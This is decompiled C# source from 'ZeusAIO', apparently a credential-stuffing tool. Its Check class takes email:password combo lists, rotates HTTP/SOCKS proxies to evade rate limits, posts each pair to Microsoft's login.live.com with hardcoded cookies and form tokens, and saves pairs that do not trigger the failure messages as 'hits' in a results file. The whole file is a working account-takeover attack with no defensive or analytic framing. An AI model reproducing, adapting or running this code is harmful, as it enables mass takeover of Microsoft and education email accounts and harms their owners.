// Decompiled with JetBrains decompiler
// Type: Microsoftandedumailaccess.Check
// Assembly: ZeusAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 70786947-2129-410F-AE9A-C082629DAC36
// Assembly location: C:\Users\ofekt\Desktop\סורס\ZeusAIO.exe

using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using ZeusAIO;

namespace Microsoftandedumailaccess
{
  internal class Check
  {
    public static int threads = 0;
    public static string proxyprotocol = "";
    public static List<string> combos;
    public static List<string> proxies1;
    public static int proxytotal = 0;
    public static int combototal = 0;
    public static int free = 0;
    public static int comboindex = 0;
    public static int cpm = 0;
    public static int cpm_aux = 0;
    public static int check = 0;
    public static int error = 0;
    public static int hit = 0;
    public static int bad = 0;
    public static int h;
    public static int m;
    public static int s;

    public static bool CheckAccount(string[] s, string proxy)
    {
      for (int index = 0; index < Config.config.Retries + 1; ++index)
      {
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              proxy = mainmenu.proxies.ElementAt<string>(new Random().Next(mainmenu.proxiesCount));
              if (mainmenu.proxyProtocol == "HTTP")
                httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS4")
                httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS5")
                httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
              httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
              httpRequest.IgnoreProtocolErrors = true;
              httpRequest.AllowAutoRedirect = true;
              httpRequest.AddHeader("COOKIE", "MSCC=104.140.14.155-US; uaid=fd1cbab376f144c196df5e9a23b38c46; cltm=nw: 2G-Slow; wlidperf=FR=L&ST=1589791817268; MSPOK=$uuid-f848f7a5-4f3b-4231-adc6-a1c149718e66$uuid-9a62249b-a69e-49c3-9c99-d723a8e568f3$uuid-07a0af7f-2dc6-4bfb-abb8-097ab40240ed$uuid-a6f0d4d6-5bce-449c-96af-3a1d4b7105a8$uuid-dd210cd0-9e62-4b28-b8a8-3580ebc2e571$uuid-f16f2879-7838-419b-ba57-4250c9addf5a$uuid-f3d25d16-bece-47ee-b829-f4b890d3111e");
              string str1 = "i13=1&login=" + s[0] + "&loginfmt=" + s[0] + "&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=" + s[1] + "&KMSI=on&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=DVh*4QvMI6bRTd4YnaA22707UG83ZOsAKbFkML%21OJZVR%21dJXv0H%21Z7aTtmWTiWWVoRJTKBwmJbhP3VG64I9RmYoDGkNjNq4kZI6RIMLkdEowptHxelObKh3aerc4DgRM8lwI7VlZbQX%21UNrsFdafA%21uRNTxhF3FBk5FQ35fplXbyVxOCPq4UZkgra4%21SAh*POXBL9*W7dplWmbNCNZdIW90%24&PPSX=P&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&i2=1&i17=0&i18=&i19=5892";
              httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
              string str2 = httpRequest.Post("https://login.live.com/ppsecure/post.srf?response_type=code&client_id=51483342-085c-4d86-bf88-cf50c7252078&scope=openid+profile+email+offline_access&response_mode=form_post&redirect_uri=https://login.microsoftonline.com/common/federation/oauth2&state=rQIIAX2RO2_TUACFc5vUNFElKujAwNCBiTaJ77WvE1vqkHdIcvMOxlkix7WJnfiBfZOQbMDChCoGho5MqGMREmKFqYDUOb8AMSGEEAMDyR9gOcM5n3Skc-6GYQJKdxCHEZfCOM6paBjnoabGRQ7iuJGGBmdgQVBF7N-I7b1CzPhF2c5e_Pr66d3L39EzEB1MzJme0Fz7HNweUeoFUjKpLqe-nrBNzXcD16CbNPkegCsAvgFwvhUIXAryIi8gkYcCn8IpmGjIbatvFTCxC1RZjlllwbJKV1vW5KLZ6PYoyRPYt3q4bpGFggivLDWedFusIrcoQXVzw9dlAmvd0bhvr718Yd4oVUZ1uTevd4v2aut6IzOlI7QR1zeX-s-tqOH69sBzA3oWfgoanu7cO8m5jqNrNLHBdIeamkpN12n6rqf71NSDY4tg3FUfssKUqEKqthDS-fbjB_VJu-R56TaxZs74vix0cJPMc8Ogs5x4sm4b0xn_KIv8Gm0KIy6TR3keVppl0pl7uUG-klFEuxQEF2FmvZTtOpfh_XWfY54c6bZqTo483zXMiX4VAd8ju2xY2tmJ7YVuhQ5CfyLg9fb6l5X68eaz8ZfSm8yTt5__7oYut5NBj7cOJ9mi02ovqlV9xjnlmt9pyJqXc-c9cZRVDufDapElQusYS_CUAacM84MBz6-FPkT_--Qqto9YxMZZGIfpA4gkCCUu1f8H0&estsfed=1&fci=23523755-3a2b-41ca-9315-f81f3f566a95&mkt=de-DE&username=<USER>&contextid=18EFE5D08A7839E1&bk=1579349616&uaid=6b063296488e426db2f4cdc4b592f609&pid=15216", str1, "application/x-www-form-urlencoded").ToString();
              if (!str2.Contains("Your account or password is incorrect") && !str2.Contains("If you no longer know your password") && (!str2.Contains("This Microsoft account does not exist. Please enter a different account") && !str2.Contains("Ihr Konto oder Kennwort ist nicht korrekt")) && !str2.Contains("Wenn Sie Ihr Kennwort nicht mehr wissen") && !str2.Contains("Dieses Microsoft-Konto ist nicht vorhanden. Geben Sie ein anderes Konto ein"))
              {
                if (str2.Contains("JavaScript required to sign in") || str2.Contains("JavaScript required for registration") || str2.Contains("JavaScript für die Anmeldung erforderlich"))
                {
                  ++mainmenu.hits;
                  if (mainmenu.p1 == "2")
                    Colorful.Console.WriteLine("[HIT - MICROSOFT & EDU MAILACCESS] " + s[0] + ":" + s[1], Color.Green);
                  Export.AsResult("/MicrosoftAndEdu_MailAccess_Hits", s[0] + ":" + s[1]);
                  return false;
                }
                break;
              }
              break;
            }
          }
          catch (Exception ex)
          {
            ++mainmenu.errors;
          }
        }
      }
      return false;
    }

    public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
  }
}
